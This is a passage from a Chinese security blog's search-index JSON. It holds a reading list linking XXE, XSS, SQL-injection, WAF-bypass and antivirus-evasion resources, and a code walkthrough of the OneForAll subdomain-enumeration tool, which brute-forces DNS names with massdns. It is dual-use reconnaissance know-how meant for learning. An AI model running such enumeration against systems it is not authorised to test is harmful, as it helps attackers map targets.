{"meta":{"title":"Tao's Blog","subtitle":"漫思茶","description":"慢慢走会比较快","author":"Tao","url":"https://Taonn.github.io","root":"/"},"pages":[{"title":"书单","date":"2021-03-17T02:13:33.901Z","updated":"2021-03-17T02:13:33.901Z","comments":false,"path":"books/index.html","permalink":"https://taonn.github.io/books/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-09-26T06:38:11.000Z","updated":"2020-09-26T06:41:07.020Z","comments":true,"path":"tags/index.html","permalink":"https://taonn.github.io/tags/index.html","excerpt":"","text":""},{"title":"404 Not Found：该页无法显示","date":"2021-03-16T04:55:35.834Z","updated":"2021-03-16T04:55:35.834Z","comments":false,"path":"/404.html","permalink":"https://taonn.github.io/404.html","excerpt":"","text":""},{"title":"categories","date":"2020-09-26T06:36:21.000Z","updated":"2020-09-26T06:37:05.719Z","comments":true,"path":"categories/index.html","permalink":"https://taonn.github.io/categories/index.html","excerpt":"","text":""},{"title":"Read","date":"2021-07-17T15:28:57.440Z","updated":"2021-07-17T15:28:57.440Z","comments":true,"path":"read/index.html","permalink":"https://taonn.github.io/read/index.html","excerpt":"","text":"2021 7.31articlesXML Schema, DTD, and Entity Attacks (vsecurity.com) What is XXE (XML external entity) injection? Tutorial &amp; Examples | Web Security Academy (portswigger.net) xee SMTP over XXE − how to send emails using Java’s XML parser - shift or die XML external entity attack - Wikipedia THE BIG BAD WOLF - XSS AND MAINTAINING ACCESS - Paulos Yibelo - Blog Excess XSS: A comprehensive tutorial on cross-site scripting (excess-xss.com) booksXML Schema, DTD, and Entity Attacks (vsecurity.com) tools[PayloadsAllTheThings/XXE Injection at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE Injection) GitHub - payloadbox/xxe-injection-payload-list: 🎯 XML External Entity (XXE) Injection Payload List 2021.4.31articlesBypass WAF Cookbook 我的WafBypass之道（SQL注入篇） Bypass AV meterpreter免杀技巧 Configuring Port Forwarding on Windows 2021.3.31articlesRedTeaming From Zero To One – Part 1 SQL Injection Bypassing WAF SQL Injection Wiki SQL Injection Pocket Reference SQL Injection Cheat Sheet The Absurdly Underestimated Dangers of CSV Injection Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609) C.XSS Guide Cross-Site Scripting – Application Security – Google books红队笔记 ired.team toolsOn Web-Security and -Insecurity: DTD Cheat Sheet (web-in-security.blogspot.com) PayloadsAllTheThings - Command Injection PayloadsAllTheThings - SQL Injection payloadbox/sql-injection-payload-list XSS Injection and bypass xss-payload-list"},{"title":"friend-links","date":"2021-05-21T08:15:45.016Z","updated":"2021-05-21T08:15:45.016Z","comments":true,"path":"links/index.html","permalink":"https://taonn.github.io/links/index.html","excerpt":"","text":""}],"posts":[{"title":"从工具OneForAll代码角度学习子域名挖掘","slug":"从工具OneForAll代码角度学习子域名挖掘","date":"2022-01-28T07:33:58.000Z","updated":"2022-02-14T07:48:25.973Z","comments":true,"path":"2022/01/28/从工具OneForAll代码角度学习子域名挖掘/","link":"","permalink":"https://taonn.github.io/2022/01/28/%E4%BB%8E%E5%B7%A5%E5%85%B7OneForAll%E4%BB%A3%E7%A0%81%E8%A7%92%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8C%96%E6%8E%98/","excerpt":"","text":"引言： 工具里用到的原理，大部分都可以通过下文找到： 子域名枚举&amp;收集 从工具OneForAll代码角度学习子域名收集 代码分析版本为：OneForAll v0.4.3 OneForAll目录结构 参考来源./docs/directory_structure.md 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176D:.| .gitignore| .travis.yml| brute.py 可以单独运行的子域爆破模块| collect.py 各个收集模块上层调用| dbexport.py 可以单独运行的数据库导出模块| Dockerfile| LICENSE| oneforall.py OneForAll主入口| Pipfile| Pipfile.lock| README.en.md| README.md| requirements.txt| takeover.py 可以单独运行的子域接口风险检查模块| _config.yml|+---.github| +---ISSUE_TEMPLATE| | bug_report.md| | bug_report_zh.md| | custom.md| | feature_request.md| || \\---workflows| test.yml||+---common 公共调用模块| crawl.py| database.py| domain.py| lookup.py| module.py| query.py| request.py| resolve.py| search.py| utils.py| __init__.py|+---config 配置目录| api.py 部分收集模块的API配置文件| log.py 日志模块配置文件| setting.py OneForAll主要配置文件|+---data 存放一些所需数据| authoritative_dns.txt 临时存放开启了泛解析域名的权威DNS名称服务器IP地址| subnames_big.7z 子域爆破超大字典| nameservers_cn.txt 中国主流名称服务器IP地址| fingerprints.json 检查子域接管风险的指纹| nameservers.txt 全球主流名称服务器IP地址| subnames_next.txt 下一层子域字典| public_suffix_list.dat 顶级域名后缀| srv_prefixes.json 常见SRV记录前缀名| subnames.txt 子域爆破常见字典|+---docs 有关文档| changes.md| collection_modules.md| contributors.md| installation_dependency.md| todo.md| troubleshooting.md| usage_example.svg| usage_help.en.md| usage_help.md|+---images| Database.png| Donate.png| Result.png|+---modules| +---autotake 自动接管模块| | github.py| || +---certificates 利用证书透明度收集子域模块| | censys_api.py| | certspotter.py| | crtsh.py| | entrust.py| | google.py| | spyse_api.py| || +---check 常规检查收集子域模块| | axfr.py| | cdx.py| | cert.py| | csp.py| | robots.py| | sitemap.py| || +---crawl 利用网上爬虫档案收集子域模块| | archivecrawl.py| | commoncrawl.py| || +---datasets 利用DNS数据集收集子域模块| | binaryedge_api.py| | bufferover.py| | cebaidu.py| | chinaz.py| | chinaz_api.py| | circl_api.py| | dnsdb_api.py| | dnsdumpster.py| | hackertarget.py| | ip138.py| | ipv4info_api.py| | netcraft.py| | passivedns_api.py| | ptrarchive.py| | qianxun.py| | rapiddns.py| | riddler.py| | robtex.py| | securitytrails_api.py| | sitedossier.py| | threatcrowd.py| | wzpc.py| | ximcx.py| || +---dnsquery 利用DNS查询收集子域模块| | mx.py| | ns.py| | soa.py| | srv.py| | txt.py| || +---intelligence 利用威胁情报平台数据收集子域模块| | alienvault.py| | riskiq_api.py| | threatbook_api.py| | threatminer.py| | virustotal.py| | virustotal_api.py| || \\---search 利用搜索引擎发现子域模块| ask.py| baidu.py| bing.py| bing_api.py| exalead.py| fofa_api.py| gitee.py| github_api.py| google.py| google_api.py| shodan_api.py| so.py| sogou.py| yahoo.py| yandex.py| zoomeye_api.py|+---results 结果目录+---test 测试目录| example.py|\\---thirdparty 存放要调用的三方工具 \\---massdns | LICENSE | massdns_darwin_x86_64 | massdns_linux_i686 | massdns_linux_x86_64 | README.md | \\---windows +---x64 | cygwin1.dll | massdns_windows_amd64.exe | \\---x86 cyggcc_s-1.dll cygwin1.dll massdns_windows_i686.exe 依赖如下： 来源./requirements.txt 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364beautifulsoup4==4.9.3bs4==0.0.1# Beautiful Soup 是一个可以从HTML或XML文件中提取数据的Python库. https://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/ certifi==2020.12.5 https://appdividend.com/2020/06/19/python-certifi-example-how-to-use-ssl-certificate-in-python/chardet==4.0.0# 判断编码 https://pypi.org/project/chardet/colorama==0.4.4# 终端颜色显示 https://pypi.org/project/colorama/dnspython==2.1.0# Dns查询工具包 https://www.dnspython.org/exrex==0.10.5# Exrex 是一个命令行工具和 python 模块，可生成与给定正则表达式等的所有或随机匹配的字符串。 https://github.com/asciimoo/exrexfire==0.4.0# Python Fire 是一个用于从绝对任何 Python 对象自动生成命令行界面 (CLI) 的库。 https://github.com/google/python-fire https://blog.csdn.net/qq_17550379/article/details/79943740future==0.18.2# 并行 https://docs.python.org/zh-cn/3/library/concurrent.futures.htmlidna==2.10 https://pypi.org/project/idna/loguru==0.5.3# 日志模块https://blog.csdn.net/cui_yonghua/article/details/107498535PySocks==1.7.1# 代理模块 https://pypi.org/project/PySocks/requests==2.25.1# 网页请求模块 https://docs.python-requests.org/en/latest/six==1.15.0# 兼容性 https://six.readthedocs.io/soupsieve==2.2.1# css选择 https://pypi.org/project/soupsieve/SQLAlchemy==1.3.22# Python SQL 工具包和对象关系映射器 https://pypi.org/project/SQLAlchemy/tenacity==7.0.0# 简化将重试行为添加到几乎任何内容的任务 https://tenacity.readthedocs.io/en/latest/termcolor==1.1.0# 终端颜色 https://pypi.org/project/termcolor/tqdm==4.59.0# 进度显示 https://github.com/tqdm/tqdmtreelib==1.6.1# 在 Python 中提供树数据结构的有效实现 https://treelib.readthedocs.io/en/latest/urllib3==1.26.4# 网页请求 https://urllib3.readthedocs.io/en/stable/win32-setctime==1.0.3# 一个小的 Python 实用程序，用于在 Windows 上设置文件创建时间。 https://pypi.org/project/win32-setctime/ 0x1 流程总结1run()-&gt;main()-&gt;detect_wildcard()泛域名解析-&gt;收集模块(Collect)-&gt;SRV爆破模块(BruteSRV)-&gt;爆破模块(Brute)-&gt;dns解析验证(resolve)-&gt;http请求验证模块(req)-&gt;爬取解析模块(Finder)-&gt;子域置换模块(Altdns)-&gt;丰富结果(enrich)-&gt;子域名接管扫描模块(Takeover) 0x2 流程分析0x2.1 run()默认配置&amp;检查 1234for domain in self.domains: self.domain = utils.get_main_domain(domain) # 注册域名 self.main() 12345def get_main_domain(domain): if not isinstance(domain, str): return None return Domain(domain).registered() # Domain类 12345678910111213141516171819202122class Domain(object): def __init__(self, string): self.string = str(string) self.regexp = r&#x27;\\b((?=[a-z0-9-]&#123;1,63&#125;\\.)(xn--)?[a-z0-9]+(-[a-z0-9]+)*\\.)+[a-z]&#123;2,63&#125;\\b&#x27; self.domain = None # 初始化 def registered(self): &quot;&quot;&quot; registered domain &gt;&gt;&gt; d = Domain(&#x27;www.example.com&#x27;) &lt;domain.Domain object&gt; &gt;&gt;&gt; d.registered() example.com :return: registered domain result &quot;&quot;&quot; result = self.extract() if result: return result.registered_domain return None # 注册&amp;解析（非dns解析）域名变量 0x2.2 main()12self.main()// 调用OneForAll类 main方法 0x2.2.11utils.init_table(self.domain) 123456def init_table(domain): db = Database() db.drop_table(domain) db.create_table(domain) db.close() //创建表（先删除，防止报错） 1234567if self.access_internet: self.enable_wildcard = wildcard.detect_wildcard(self.domain) # 泛域名解析 collect = Collect(self.domain) collect.run() # 跑collect模块 123456789101112131415def to_detect_wildcard(domain): &quot;&quot;&quot; Detect use wildcard dns record or not :param str domain: domain :return bool use wildcard dns record or not &quot;&quot;&quot; logger.log(&#x27;INFOR&#x27;, f&#x27;Detecting &#123;domain&#125; use wildcard dns record or not&#x27;) random_subdomains = gen_random_subdomains(domain, 3) # 随机生成子域名 if not all_resolve_success(random_subdomains): return False is_all_success, all_request_resp = all_request_success(random_subdomains) if not is_all_success: return True return any_similar_html(all_request_resp) 1234567891011121314def gen_random_subdomains(domain, count): &quot;&quot;&quot; 生成指定数量的随机子域域名列表 :param domain: 主域 :param count: 数量 &quot;&quot;&quot; subdomains = set() if count &lt; 1: return subdomains for _ in range(count): token = secrets.token_hex(4) subdomains.add(f&#x27;&#123;token&#125;.&#123;domain&#125;&#x27;) return subdomains 0x2.2.2 Collect()模块以下为收集模块代码： 12345678910111213141516171819202122232425262728293031class Collect(object): def __init__(self, domain): self.domain = domain self.modules = [] self.collect_funcs = [] def run(self): &quot;&quot;&quot; Class entrance &quot;&quot;&quot; logger.log(&#x27;INFOR&#x27;, f&#x27;Start collecting subdomains of &#123;self.domain&#125;&#x27;) self.get_mod() self.import_func() # 注意上面这两个函数 threads = [] # Create subdomain collection threads for func_obj, func_name in self.collect_funcs: thread = threading.Thread(target=func_obj, name=func_name, args=(self.domain,), daemon=True) threads.append(thread) # Start all threads for thread in threads: thread.start() # Wait for all threads to finish for thread in threads: # 挨个线程判断超时 最坏情况主线程阻塞时间=线程数*module_thread_timeout # 超时线程将脱离主线程 由于创建线程时已添加守护属于 所有超时线程会随着主线程结束 thread.join(settings.module_thread_timeout) for thread in threads: if thread.is_alive(): logger.log(&#x27;ALERT&#x27;, f&#x27;&#123;thread.name&#125; module thread timed out&#x27;) 1234567891011121314151617def get_mod(self): &quot;&quot;&quot; Get modules &quot;&quot;&quot; if settings.enable_all_module: # The crawl module has some problems modules = [&#x27;certificates&#x27;, &#x27;check&#x27;, &#x27;datasets&#x27;, &#x27;dnsquery&#x27;, &#x27;intelligence&#x27;, &#x27;search&#x27;] for module in modules: module_path = settings.module_dir.joinpath(module) for path in module_path.rglob(&#x27;*.py&#x27;): import_module = f&#x27;modules.&#123;module&#125;.&#123;path.stem&#125;&#x27; self.modules.append(import_module) # modules文件导入 else: self.modules = settings.enable_partial_module 12345678910def import_func(self): &quot;&quot;&quot; Import do function &quot;&quot;&quot; for module in self.modules: name = module.split(&#x27;.&#x27;)[-1] import_object = importlib.import_module(module) func = getattr(import_object, &#x27;run&#x27;) self.collect_funcs.append([func, name]) # 获取module每个py文件run方法 1234for func_obj, func_name in self.collect_funcs: thread = threading.Thread(target=func_obj, name=func_name, args=(self.domain,), daemon=True) threads.append(thread) modules每个py文件模板差不多都长这样 因此，这里用到了继承，也重点关注下这块的代码 12345678910from common.query import Queryclass CensysAPI(Query): def run(): self.begin() self.query() // 除了query，其他方法均继承与Query类 self.finish() self.save_json() self.gen_result() self.save_db() Query继承于Module类 123456789from common.module import Moduleclass Query(Module): &quot;&quot;&quot; Query base class &quot;&quot;&quot; def __init__(self): Module.__init__(self) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167class Module(object): def __init__(self): self.module = &#x27;Module&#x27; self.source = &#x27;BaseModule&#x27; self.cookie = None self.header = dict() self.proxy = None self.delay = 1 # 请求睡眠时延 self.timeout = settings.request_timeout_second # 请求超时时间 self.verify = settings.request_ssl_verify # 请求SSL验证 self.domain = str() # 当前进行子域名收集的主域 self.subdomains = set() # 存放发现的子域 self.infos = dict() # 存放子域有关信息 self.results = list() # 存放模块结果 self.start = time.time() # 模块开始执行时间 self.end = None # 模块结束执行时间 self.elapse = None # 模块执行耗时 def begin(self): &quot;&quot;&quot; begin log &quot;&quot;&quot; logger.log(&#x27;DEBUG&#x27;, f&#x27;Start &#123;self.source&#125; module to &#x27; f&#x27;collect subdomains of &#123;self.domain&#125;&#x27;) def finish(self): &quot;&quot;&quot; finish log &quot;&quot;&quot; self.end = time.time() self.elapse = round(self.end - self.start, 1) logger.log(&#x27;DEBUG&#x27;, f&#x27;Finished &#123;self.source&#125; module to &#x27; f&#x27;collect &#123;self.domain&#125;\\&#x27;s subdomains&#x27;) logger.log(&#x27;INFOR&#x27;, f&#x27;&#123;self.source&#125; module took &#123;self.elapse&#125; seconds &#x27; f&#x27;found &#123;len(self.subdomains)&#125; subdomains&#x27;) logger.log(&#x27;DEBUG&#x27;, f&#x27;&#123;self.source&#125; module found subdomains of &#123;self.domain&#125;\\n&#x27; f&#x27;&#123;self.subdomains&#125;&#x27;) ....... ....... ....... # 重写了get,post,head等请求 def save_json(self): &quot;&quot;&quot; Save the results of each module as a json file :return bool: whether saved successfully &quot;&quot;&quot; if not settings.save_module_result: return False logger.log(&#x27;TRACE&#x27;, f&#x27;Save the subdomain results found by &#x27; f&#x27;&#123;self.source&#125; module as a json file&#x27;) path = settings.result_save_dir.joinpath(self.domain, self.module) path.mkdir(parents=True, exist_ok=True) name = self.source + &#x27;.json&#x27; path = path.joinpath(name) with open(path, mode=&#x27;w&#x27;, errors=&#x27;ignore&#x27;) as file: result = &#123;&#x27;domain&#x27;: self.domain, &#x27;name&#x27;: self.module, &#x27;source&#x27;: self.source, &#x27;elapse&#x27;: self.elapse, &#x27;find&#x27;: len(self.subdomains), &#x27;subdomains&#x27;: list(self.subdomains), &#x27;infos&#x27;: self.infos&#125; json.dump(result, file, ensure_ascii=False, indent=4) return True def gen_result(self): &quot;&quot;&quot; Generate results &quot;&quot;&quot; logger.log(&#x27;DEBUG&#x27;, f&#x27;Generating final results&#x27;) if not len(self.subdomains): # 该模块一个子域都没有发现的情况 logger.log(&#x27;DEBUG&#x27;, f&#x27;&#123;self.source&#125; module result is empty&#x27;) result = &#123;&#x27;id&#x27;: None, &#x27;alive&#x27;: None, &#x27;request&#x27;: None, &#x27;resolve&#x27;: None, &#x27;url&#x27;: None, &#x27;subdomain&#x27;: None, &#x27;port&#x27;: None, &#x27;level&#x27;: None, &#x27;cname&#x27;: None, &#x27;ip&#x27;: None, &#x27;public&#x27;: None, &#x27;cdn&#x27;: None, &#x27;status&#x27;: None, &#x27;reason&#x27;: None, &#x27;title&#x27;: None, &#x27;banner&#x27;: None, &#x27;header&#x27;: None, &#x27;history&#x27;: None, &#x27;response&#x27;: None, &#x27;ip_times&#x27;: None, &#x27;cname_times&#x27;: None, &#x27;ttl&#x27;: None, &#x27;cidr&#x27;: None, &#x27;asn&#x27;: None, &#x27;org&#x27;: None, &#x27;addr&#x27;: None, &#x27;isp&#x27;: None, &#x27;resolver&#x27;: None, &#x27;module&#x27;: self.module, &#x27;source&#x27;: self.source, &#x27;elapse&#x27;: self.elapse, &#x27;find&#x27;: None&#125; self.results.append(result) else: for subdomain in self.subdomains: url = &#x27;http://&#x27; + subdomain level = subdomain.count(&#x27;.&#x27;) - self.domain.count(&#x27;.&#x27;) info = self.infos.get(subdomain) if info is None: info = dict() cname = info.get(&#x27;cname&#x27;) ip = info.get(&#x27;ip&#x27;) ip_times = info.get(&#x27;ip_times&#x27;) cname_times = info.get(&#x27;cname_times&#x27;) ttl = info.get(&#x27;ttl&#x27;) if isinstance(cname, list): cname = &#x27;,&#x27;.join(cname) ip = &#x27;,&#x27;.join(ip) ip_times = &#x27;,&#x27;.join([str(num) for num in ip_times]) cname_times = &#x27;,&#x27;.join([str(num) for num in cname_times]) ttl = &#x27;,&#x27;.join([str(num) for num in ttl]) result = &#123;&#x27;id&#x27;: None, &#x27;alive&#x27;: info.get(&#x27;alive&#x27;), &#x27;request&#x27;: info.get(&#x27;request&#x27;), &#x27;resolve&#x27;: info.get(&#x27;resolve&#x27;), &#x27;url&#x27;: url, &#x27;subdomain&#x27;: subdomain, &#x27;port&#x27;: 80, &#x27;level&#x27;: level, &#x27;cname&#x27;: cname, &#x27;ip&#x27;: ip, &#x27;public&#x27;: info.get(&#x27;public&#x27;), &#x27;cdn&#x27;: info.get(&#x27;cdn&#x27;), &#x27;status&#x27;: None, &#x27;reason&#x27;: info.get(&#x27;reason&#x27;), &#x27;title&#x27;: None, &#x27;banner&#x27;: None, &#x27;header&#x27;: None, &#x27;history&#x27;: None, &#x27;response&#x27;: None, &#x27;ip_times&#x27;: ip_times, &#x27;cname_times&#x27;: cname_times, &#x27;ttl&#x27;: ttl, &#x27;cidr&#x27;: info.get(&#x27;cidr&#x27;), &#x27;asn&#x27;: info.get(&#x27;asn&#x27;), &#x27;org&#x27;: info.get(&#x27;org&#x27;), &#x27;addr&#x27;: info.get(&#x27;addr&#x27;), &#x27;isp&#x27;: info.get(&#x27;isp&#x27;), &#x27;resolver&#x27;: info.get(&#x27;resolver&#x27;), &#x27;module&#x27;: self.module, &#x27;source&#x27;: self.source, &#x27;elapse&#x27;: self.elapse, &#x27;find&#x27;: len(self.subdomains)&#125; self.results.append(result) def save_db(self): &quot;&quot;&quot; Save module results into the database &quot;&quot;&quot; logger.log(&#x27;DEBUG&#x27;, f&#x27;Saving results to database&#x27;) lock.acquire() db = Database() db.create_table(self.domain) db.save_db(self.domain, self.results, self.source) db.close() lock.release() 单独拎出来：（不重要的省略，但是不影响后面分析） 1234567def run(): self.begin() # 输出日志 self.query() # 除了query，其他方法均继承与Query类 self.finish() # 输出日志，计算query用了多少时间 self.save_json() # 保存json self.gen_result() self.save_db() 123456789101112save_json() name = self.source + &#x27;.json&#x27; path = path.joinpath(name) with open(path, mode=&#x27;w&#x27;, errors=&#x27;ignore&#x27;) as file: result = &#123;&#x27;domain&#x27;: self.domain, &#x27;name&#x27;: self.module, &#x27;source&#x27;: self.source, &#x27;elapse&#x27;: self.elapse, &#x27;find&#x27;: len(self.subdomains), &#x27;subdomains&#x27;: list(self.subdomains), &#x27;infos&#x27;: self.infos&#125; json.dump(result, file, ensure_ascii=False, indent=4) 123gen_result() result &#x3D; ...... self.results.append(result) 123save_db(self): db.save_db(self.domain, self.results, self.source) # 重点可以如何存储的数据 这里用了多线程 12345678def save_db(self, table_name, results, module_name=None): table_name = table_name.replace(&#x27;.&#x27;, &#x27;_&#x27;) if results: try: self.conn.bulk_query(insert data sql) # self.conn = self.get_conn(db_path) # return db.get_connection() # Connection(self._engine.connect()) 1234def bulk_query(self, query, *multiparams): self._conn.execute(text(query), *multiparams) # self._conn = Connection(self._engine.connect())# 这里挺绕的😅 collect模块跑完了，最终数据都在self.results（这其中，跑完一个小模块，存数据，边跑边存） 注意：此时的数据还未进行解析验证、http请求等 后续还有对其导出再删除表再新建表重新插入数据的操作 Collect()总结图如下： 0x2.2.3 BruteSRV123# 回到 oneforall.py - 161行srv = BruteSRV(self.domain) srv.run() 1234567891011121314151617181920class BruteSRV(Module): def __init__(self, domain): Module.__init__(self) self.domain = domain self.module = &#x27;BruteSRV&#x27; self.source = &quot;BruteSRV&quot; self.qtype = &#x27;SRV&#x27; self.thread_num = 20 self.names_queue = queue.Queue() self.answers_queue = queue.Queue() def run(self): self.begin() # 继承的，跟上面一样 self.fill_queue() # 读取 srv_prefixes.json self.do_brute() # 多线程爆破 self.deal_answers() # self.finish() self.save_json() self.gen_result() self.save_db()# 继承于Module.py 12345self.fill_queue() path = data_storage_dir.joinpath(&#x27;srv_prefixes.json&#x27;) prefixes = utils.load_json(path) for prefix in prefixes: self.names_queue.put(prefix + self.domain) 12345678def do_brute(self): for num in range(self.thread_num): thread = BruteThread(self.names_queue, self.answers_queue) # 类继承方式 多线程 thread.name = f&#x27;BruteThread-&#123;num&#125;&#x27; thread.daemon = True thread.start() self.names_queue.join() 123456789def deal_answers(self): while not self.answers_queue.empty(): answer = self.answers_queue.get() if answer is None: continue for item in answer: record = str(item) subdomains = self.match_subdomains(record) self.subdomains.update(subdomains) # set集合存结果 0x2.2.4 brute模块123456789# 爆破模块, 调用brute.py文件if self.brute: # Due to there will be a large number of dns resolution requests, # may cause other network tasks to be error brute = Brute(self.domain, word=True, export=False) brute.enable_wildcard = self.enable_wildcard brute.in_china = self.in_china brute.quite = True brute.run() 123456789101112131415161718192021222324def main(self, domain): start = time.time() logger.log(&#x27;INFOR&#x27;, f&#x27;Blasting &#123;domain&#125; &#x27;) massdns_dir = settings.third_party_dir.joinpath(&#x27;massdns&#x27;) result_dir = settings.result_save_dir temp_dir = result_dir.joinpath(&#x27;temp&#x27;) utils.check_dir(temp_dir) massdns_path = utils.get_massdns_path(massdns_dir) timestring = utils.get_timestring() wildcard_ips = list() # 泛解析IP列表 wildcard_ttl = int() # 泛解析TTL整型值 ns_list = query_domain_ns(self.domain) ns_ip_list = query_domain_ns_a(ns_list) # DNS权威名称服务器对应A记录列表 if self.enable_wildcard is None: self.enable_wildcard = wildcard.detect_wildcard(domain) if self.enable_wildcard: wildcard_ips, wildcard_ttl = wildcard.collect_wildcard_record(domain, ns_ip_list) ns_path = utils.get_ns_path(self.in_china, self.enable_wildcard, ns_ip_list) dict_set = self.gen_brute_dict(domain) # 生成字典 123456789101112131415161718192021222324def gen_brute_dict(self, domain): logger.log(&#x27;INFOR&#x27;, f&#x27;Generating dictionary for &#123;domain&#125;&#x27;) dict_set = set() # 如果domain不是self.subdomain 而是self.domain的子域则生成递归爆破字典 if self.word: self.place = &#x27;&#x27; if not self.place: self.place = &#x27;*.&#x27; + domain wordlist = self.wordlist main_domain = utils.get_main_domain(domain) if domain != main_domain: wordlist = self.recursive_nextlist if self.word: word_subdomains = gen_word_subdomains(self.place, wordlist) dict_set.update(word_subdomains) if self.fuzz: fuzz_subdomains = gen_fuzz_subdomains(self.place, self.rule, self.fuzzlist) dict_set.update(fuzz_subdomains) count = len(dict_set) logger.log(&#x27;INFOR&#x27;, f&#x27;Dictionary size: &#123;count&#125;&#x27;) if count &gt; 10000000: logger.log(&#x27;ALERT&#x27;, f&#x27;The generated dictionary is &#x27; f&#x27;too large &#123;count&#125; &gt; 10000000&#x27;) return dict_set 未指定参数--wordlist,默认调用的是./data/subnames.txt字典文件，95247个子域名爆破 字典数大于10000000会报。。。 12345678910111213141516171819202122232425262728dict_name = f&#x27;generated_subdomains_&#123;domain&#125;_&#123;timestring&#125;.txt&#x27; dict_path = temp_dir.joinpath(dict_name) save_brute_dict(dict_path, dict_set) del dict_set gc.collect() output_name = f&#x27;resolved_result_&#123;domain&#125;_&#123;timestring&#125;.json&#x27; output_path = temp_dir.joinpath(output_name) log_path = result_dir.joinpath(&#x27;massdns.log&#x27;) check_dict() logger.log(&#x27;INFOR&#x27;, f&#x27;Running massdns to brute subdomains&#x27;) utils.call_massdns(massdns_path, dict_path, ns_path, output_path, log_path, quiet_mode=self.quite, concurrent_num=self.concurrent_num) # 调用massdns进行暴力破解 appear_times = stat_appear_times(output_path) self.infos, self.subdomains = deal_output(output_path, appear_times, wildcard_ips, wildcard_ttl) delete_file(dict_path, output_path) end = time.time() self.elapse = round(end - start, 1) logger.log(&#x27;ALERT&#x27;, f&#x27;&#123;self.source&#125; module takes &#123;self.elapse&#125; seconds, &#x27; f&#x27;found &#123;len(self.subdomains)&#125; subdomains of &#123;domain&#125;&#x27;) logger.log(&#x27;DEBUG&#x27;, f&#x27;&#123;self.source&#125; module found subdomains of &#123;domain&#125;: &#x27; f&#x27;&#123;self.subdomains&#125;&#x27;) self.gen_result() self.save_db() return self.subdomains 12# call_massdns函数cmd massdns.exe ....... 调用massdns爆破 0x2.2.5 数据处理1utils.deal_data(self.domain) 12345def deal_data(domain): db = Database() db.remove_invalid(domain) db.deduplicate_subdomain(domain) db.close() 1234567891011def remove_invalid(self, table_name): &quot;&quot;&quot; Remove nulls or invalid subdomains in the table :param str table_name: table name &quot;&quot;&quot; table_name = table_name.replace(&#x27;.&#x27;, &#x27;_&#x27;) logger.log(&#x27;TRACE&#x27;, f&#x27;Removing invalid subdomains in &#123;table_name&#125; table&#x27;) self.query(f&#x27;delete from &quot;&#123;table_name&#125;&quot; where &#x27; f&#x27;subdomain is null or resolve == 0&#x27;) # 移除无效数据 123456789101112def deduplicate_subdomain(self, table_name): &quot;&quot;&quot; Deduplicate subdomains in the table :param str table_name: table name &quot;&quot;&quot; table_name = table_name.replace(&#x27;.&#x27;, &#x27;_&#x27;) logger.log(&#x27;TRACE&#x27;, f&#x27;Deduplicating subdomains in &#123;table_name&#125; table&#x27;) self.query(f&#x27;delete from &quot;&#123;table_name&#125;&quot; where &#x27; f&#x27;id not in (select min(id) &#x27; f&#x27;from &quot;&#123;table_name&#125;&quot; group by subdomain)&#x27;) # 数据去重 0x2.2.61234if not self.dns: self.data &#x3D; self.export_data() # 导出数据 self.datas.extend(self.data) # self.datas新列表存储数据 return self.data # 1self.data = self.export_data() 12345678def export_data(self): &quot;&quot;&quot; Export data from the database :return: exported data :rtype: list &quot;&quot;&quot; return export.export_data(self.domain, alive=self.alive, fmt=self.fmt, path=self.path) 12345678910111213141516171819202122232425262728293031323334353637def export_data(target, db=None, alive=False, limit=None, path=None, fmt=&#x27;csv&#x27;, show=False): &quot;&quot;&quot; OneForAll export from database module Example: python3 export.py --target name --fmt csv --dir= ./result.csv python3 export.py --target name --tb True --show False python3 export.py --db result.db --target name --show False Note: --fmt csv/json (result format) --path Result directory (default directory is ./results) :param str target: Table to be exported :param str db: Database path to be exported (default ./results/result.sqlite3) :param bool alive: Only export the results of alive subdomains (default False) :param str limit: Export limit (default None) :param str fmt: Result format (default csv) :param str path: Result directory (default None) :param bool show: Displays the exported data in terminal (default False) &quot;&quot;&quot; database = Database(db) domains = utils.get_domains(target) datas = list() if domains: for domain in domains: table_name = domain.replace(&#x27;.&#x27;, &#x27;_&#x27;) rows = database.export_data(table_name, alive, limit) # !!! if rows is None: continue data, _, _ = do_export(fmt, path, rows, show, domain, target)# !!! datas.extend(data) database.close() if len(domains) &gt; 1: utils.export_all(alive, fmt, path, datas) # !!! return datas 12345678910111213141516171819202122def export_data(self, table_name, alive, limit): &quot;&quot;&quot; Get part of the data in the table :param str table_name: table name :param any alive: alive flag :param str limit: limit value &quot;&quot;&quot; table_name = table_name.replace(&#x27;.&#x27;, &#x27;_&#x27;) sql = f&#x27;select id, alive, request, resolve, url, subdomain, level,&#x27; \\ f&#x27;cname, ip, public, cdn, port, status, reason, title, banner,&#x27; \\ f&#x27;cidr, asn, org, addr, isp, source from &quot;&#123;table_name&#125;&quot; &#x27; if alive and limit: if limit in [&#x27;resolve&#x27;, &#x27;request&#x27;]: where = f&#x27; where &#123;limit&#125; = 1&#x27; sql += where elif alive: where = f&#x27; where alive = 1&#x27; sql += where sql += &#x27; order by subdomain&#x27; logger.log(&#x27;TRACE&#x27;, f&#x27;Get the data from &#123;table_name&#125; table&#x27;) return self.query(sql) 12345678910def do_export(fmt, path, rows, show, domain, target): fmt = utils.check_format(fmt) path = utils.check_path(path, target, fmt) if show: print(rows.dataset) data = rows.export(fmt) utils.save_to_file(path, data) logger.log(&#x27;ALERT&#x27;, f&#x27;The subdomain result for &#123;domain&#125;: &#123;path&#125;&#x27;) data = rows.as_dict() return data, fmt, path 1234567891011121314def export_all(alive, fmt, path, datas): &quot;&quot;&quot; 将所有结果数据导出 :param bool alive: 只导出存活子域结果 :param str fmt: 导出文件格式 :param str path: 导出文件路径 :param list datas: 待导出的结果数据 &quot;&quot;&quot; fmt = check_format(fmt) timestamp = get_timestring() 